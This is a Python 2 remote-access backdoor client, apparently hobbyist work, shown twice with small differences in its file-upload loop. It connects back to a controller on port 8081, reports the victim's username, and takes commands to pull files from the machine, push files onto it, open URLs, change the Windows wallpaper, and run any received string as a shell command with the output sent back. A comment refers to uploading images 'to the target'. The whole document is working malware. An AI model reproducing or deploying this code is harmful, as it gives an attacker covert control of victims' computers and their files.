

import socket 
import subprocess 
import os          
import webbrowser
import platform
import ctypes
import hashlib

def transfer(s,command,username):
    x1,src,dst=map(str,command.split('*'))
    if (x1=='download'):
        if os.path.exists(src):
            f = open(src, 'rb')
            packet = f.read(1024)
            while packet != '':
                s.send(packet) 
                packet = f.read(1024)
            s.send('DONE')
            f.close()
        else: # the file doesn't exist
            s.send('Unable to find out the file')
  
    elif (x1=='upload'):
        file_to_write=open(dst,'wb')
        bits=s.recv(1024)    
        while True: 
            if not bits.endswith('DONE'):
                file_to_write.write(bits)
            elif bits.endswith('DONE'):
                bits=bits.replace('DONE','')
                file_to_write.write(bits)
                file_to_write.close()
                break
            bits=s.recv(1024)
        md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
        md5_sv=s.recv(1024)
        if md5_cl==md5_sv:
            s.send('md5 OK')
        else :
            s.send('md5 NOK')
#upload needs fixing                

def __browse(s,command):
    new = 2 
    url=command.split(' ')[-1]
    url="http://"+url
    webbrowser.open(url)

def change_desktop_bg(s,command):

    #need to make the path variable because i will normally upload an image from my system to the target
    bg_path=str(command.split(' ')[-1])
    
    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)

        
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8081))
    os=str(platform.system())
    CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    username=str(CMD.stdout.read().split('\\')[-1])
    s.send(username)
    while True: 
        command=s.recv(1024)
        if 'terminate' in command:
            s.close()
            break 
        elif 'download' in command:            
            transfer(s,command,username)
        elif 'upload' in command:
            transfer(s,command,username)
        elif 'browse' in command:
            __browse(s,command)
        elif ('change_desktop_bg' in command ) and (os=='Windows'):             #BTW This is working only on windows
            change_desktop_bg(s,command)
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect()
main()








import socket 
import subprocess 
import os          
import webbrowser
import platform
import ctypes
import hashlib

def transfer(s,command,username):
    x1,src,dst=map(str,command.split('*'))
    if (x1=='download'):
        if os.path.exists(src):
            f = open(src, 'rb')
            packet = f.read(1024)
            while packet != '':
                s.send(packet) 
                packet = f.read(1024)
            s.send('DONE')
            f.close()
        else: # the file doesn't exist
            s.send('Unable to find out the file')
  
    elif (x1=='upload'):
        '''username=username.replace(username[-1],'')
        username=username.replace('\r','')
        file_to_write=open('C:\\Users\\'+username+'\\'+dst,'wb')'''
        file_to_write=open(dst,'wb')
        bits=s.recv(1024)    
        while True: 
            file_to_write.write(bits)
            if bits.endswith('DONE'):
                bits=bits.replace('DONE','')
                file_to_write.write(bits)
                file_to_write.close()
                break
            bits=s.recv(1024)
        md5_cl=hashlib.md5(open(dst,'rb').read()).hexdigest()
        md5_sv=s.recv(1024)
        if md5_cl==md5_sv:
            s.send('md5 OK')
        else :
            s.send('md5 NOK')
#upload needs fixing                

def __browse(s,command):
    new = 2 
    url=command.split(' ')[-1]
    url="http://"+url
    webbrowser.open(url)

def change_desktop_bg(s,command):

    #need to make the path variable because i will normally upload an image from my system to the target
    bg_path=str(command.split(' ')[-1])
    
    SPI_SETDESKWALLPAPER = 20 
    ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, bg_path , 0)

        
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 8081))
    os=str(platform.system())
    CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    username=str(CMD.stdout.read().split('\\')[-1])
    s.send(username)
    while True: 
        command=s.recv(1024)
        if 'terminate' in command:
            s.close()
            break 
        elif 'download' in command:            
            transfer(s,command,username)
        elif 'upload' in command:
            transfer(s,command,username)
        elif 'browse' in command:
            __browse(s,command)
        elif ('change_desktop_bg' in command ) and (os=='Windows'):             #BTW This is working only on windows
            change_desktop_bg(s,command)
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) 
            s.send( CMD.stderr.read()  ) 

def main ():
    connect()
main()






